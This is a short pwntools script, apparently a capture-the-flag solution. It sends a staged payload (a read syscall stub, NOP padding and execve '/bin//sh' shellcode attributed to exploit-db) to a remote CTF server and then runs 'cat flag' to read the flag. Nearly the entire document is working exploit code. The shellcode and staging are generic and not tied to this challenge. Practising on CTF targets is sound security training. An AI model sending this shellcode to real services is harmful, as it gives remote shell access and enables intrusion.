from pwn import *

context.arch = 'amd64'

payload = '''
mov rdi, rax
push 0x64
pop rdx
syscall
'''

padding = asm('nop')*len(payload)

# https://www.exploit-db.com/exploits/43550/
shell = '''
push 59
pop rax
cdq
push rdx
mov rbx,0x68732f6e69622f2f
push rbx
push rsp
pop rdi
push rdx
push rdi
push rsp
pop rsi
syscall
'''

final = asm(payload)+padding+asm(shell)

#print(final)
r = remote('csie.ctf.tw', 10122)
r.sendline(final)
#r.interactive()
r.sendline('cat flag')
print(r.recvline())
r.close()
